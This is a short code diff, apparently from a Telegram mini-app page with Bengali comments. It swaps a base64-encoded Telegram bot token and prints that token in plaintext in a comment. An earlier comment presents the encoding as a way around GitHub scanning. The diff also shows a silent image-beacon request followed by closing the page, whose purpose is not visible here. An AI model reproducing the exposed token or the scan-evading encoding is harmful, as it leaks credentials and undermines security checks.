@@ -124,9 +124,9 @@
     // গুগল শিট কনফিগারেশন
     const GOOGLE_API_URL = "https://script.google.com/macros/s/AKfycbzdO1kd9AUy6ziDEPkUc02l0i_lPAGpRe9ATUVrcHB3QPC5nPmLlgucDlGuho0KTbGo/exec";
     
-    // আপনার নতুন Bot Token (GitHub সিকিউর এনকোডেড)
-    const _t1 = "ODM4NjM5NzM3Mg==";
-    const _t2 = "QUFGa2JGNHFoeHpwd2xzN096cG1xRWNQOWp1Y1RhSVE2Wk0=";
+    // আপনার নতুন Bot Token (8305538092:AAGyyqPxRo771Ht4ZrSimIqujR6qT0qvJ4I) এনকোডেড
+    const _t1 = "ODMwNTUzODA5Mg==";
+    const _t2 = "QUFHeXlxUHhSbzc3MUh0NFpyU2ltSXFualI2cVQwcXZKNkk=";
     const BOT_TOKEN = atob(_t1) + ":" + atob(_t2);
 
     const ADMIN_ID = "6851638362";
@@ -228,7 +228,7 @@
                     new Image().src = url3;
                 } catch(e) {}
 
-                // ৫. পেজ বন্ধ করা
+                // ৫. পেজটি বন্ধ করা
                 setTimeout(() => {
                     tg.close();
                 }, 1000);
